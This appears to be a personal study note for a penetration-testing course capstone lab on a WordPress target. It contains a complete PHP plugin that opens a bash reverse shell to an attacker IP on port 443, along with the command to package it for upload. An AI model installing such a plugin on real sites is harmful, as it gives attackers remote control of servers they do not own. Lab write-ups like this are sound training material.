3. **Capstone Lab**: Start Module Exercise VM 1 and add a new administrative account like we did in this Learning Unit. Next, craft a WordPress plugin that embeds a web shell and exploit it to enumerate the target system. Upgrade the web shell to a full reverse shell and obtain the flag located in **/tmp/**. Note: The WordPress instance might show slow responsiveness due to lack of internet connectivity, which is expected.

Basically followed this blog to get web shell:

https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell

```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.224/443 0>&1'");
?>

```

`zip revsh-plugin.zip revshplugin.php`

![[Pasted image 20250127230306.png]]
